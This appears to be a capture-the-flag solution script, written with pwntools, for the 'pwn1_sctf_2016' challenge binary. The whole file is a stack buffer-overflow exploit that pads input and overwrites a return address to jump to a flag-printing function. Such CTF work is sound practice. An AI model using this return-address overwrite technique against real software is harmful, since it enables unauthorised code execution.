from pwn import*
elf=ELF('./pwn1_sctf_2016')
p=process('./pwn1_sctf_2016')
flag=0x8048f0d
payload=b'I'*20+b'aaaa'+p32(flag)
p.sendline(payload)
p.interactive()